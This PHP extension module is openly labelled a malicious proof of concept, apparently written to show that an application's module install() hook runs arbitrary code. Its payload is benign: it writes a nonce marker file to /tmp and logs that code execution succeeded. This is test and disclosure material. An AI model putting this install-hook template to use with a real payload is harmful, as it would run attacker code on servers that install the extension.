<?php

namespace Modules\Malicious\Poc;

use App\Extension\AbstractModule;
use Illuminate\Support\Facades\Log;

class Module extends AbstractModule
{
    public function install(): bool
    {
        Log::info('[MaliciousPoc] install() called - RCE executed!');

        $markerPath = '/tmp/g7_rce_poc_install_' . uniqid() . '.txt';
        $nonce = bin2hex(random_bytes(8));
        
        $content = "G7_RCE_POC_INSTALL: {$nonce}\n";
        $content .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $content .= "Extension: malicious-poc\n";
        $content .= "Method: Module::install()\n";
        
        file_put_contents($markerPath, $content);
        
        Log::info("[MaliciousPoc] RCE confirmed - marker: {$markerPath}");

        return parent::install();
    }

    public function boot()
    {
        parent::boot();
    }

    public function register()
    {
        $this->registerConfig();
        $this->registerProviders();
    }
}
